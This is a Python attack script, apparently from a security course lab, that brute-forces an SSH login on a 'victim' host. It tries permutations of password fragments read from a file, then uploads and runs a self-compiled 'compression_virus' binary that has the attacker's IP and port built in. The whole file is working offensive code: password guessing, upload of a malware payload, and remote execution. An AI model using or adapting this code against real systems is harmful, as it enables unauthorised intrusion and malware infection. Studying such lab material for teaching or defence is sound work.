#!/usr/bin/python3
import itertools
import paramiko
import sys
import os

if len(sys.argv) != 4:
    print(f'Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>')
    sys.exit(1)
victim_IP = sys.argv[1]
attacker_IP = sys.argv[2]
attacker_port = sys.argv[3]

# read file from victim.dat
file = open('/app/victim.dat', 'r')
lines = file.readlines()
file.close()

# strip newline character
fractions = [line.strip() for line in lines]

# write attacker's IP and port to the header file
file = open('./attacker.h', 'w')
file.write('#include <string>\n')
file.write('using namespace std;\n')
file.write('string attacker_IP = \"'+attacker_IP+"\";\n")
file.write('string attacker_port = \"'+attacker_port+"\";\n")
file.close()
# compile compression_virus.cpp
os.system('g++ -o compression_virus compression_virus.cpp -Os -s')


for i in range(len(fractions)+1):
    if i>0:
        for combination in itertools.permutations(fractions, i):
            guess = ""
            for part in combination:
                guess += part

            # use paramiko to establish SSH connection to the victim 
            try:
                client = paramiko.SSHClient()

                # Allow connection with host not on the known_hosts file
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # increase banner_timeout to prevent from timeout from the banner
                client.connect(victim_IP, 22, username='csc2024', password=guess, timeout=30, banner_timeout=30)
                
                print("Correct password: ", guess)

                # copy the victim's original ls to victim's current location
                client.exec_command('cp /usr/bin/ls /app/ls')

                # open sftp to transmit the compressed virus
                sftp = client.open_sftp()
                sftp.put('./compression_virus', '/app/compression_virus')
                sftp.close()
                
                client.exec_command('chmod +x /app/compression_virus')
                client.exec_command('/app/compression_virus')
                client.close()
                exit(0)
            except paramiko.ssh_exception.AuthenticationException:
                # 密碼錯誤
                print("Wrong password: ", guess)
                client.close()
                continue
            except paramiko.ssh_exception.SSHException:
                # paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
                # 密碼錯誤次數太多paramiko會把request擋掉導致exception
                client.close()
                continue
            except EOFError:
                '''
                as i see it, with ssh=SSHClient() you create an SSHClient-Object, and then 
                with sftp=ssh.open_sftp() you create an sftp-object. while you only want to 
                use the sftp, you store the ssh in a local variable, which then gets gc'd, 
                but, if the ssh is gc'd, the sftp magically stops working. don't know why, 
                but try to store the ssh for the time your sftp lives.
                '''
                '''
                [Bug] #44: (via #891) SSHClient now gives its internal Transport a handle on 
                itself, preventing garbage collection of the client until the session is closed. 
                Without this, some code which returns stream or transport objects without the 
                client that generated them, would result in premature session closure when the 
                client was GCd. Credit: @w31rd0 for original report, Omer Anson for the patch.
                '''
                # gc可能指Garbage Collection，我看不懂，此錯誤低機率出現
                client.close()
                continue
            except Exception as e:
                print(f'{e}') # other error
                client.close()
                continue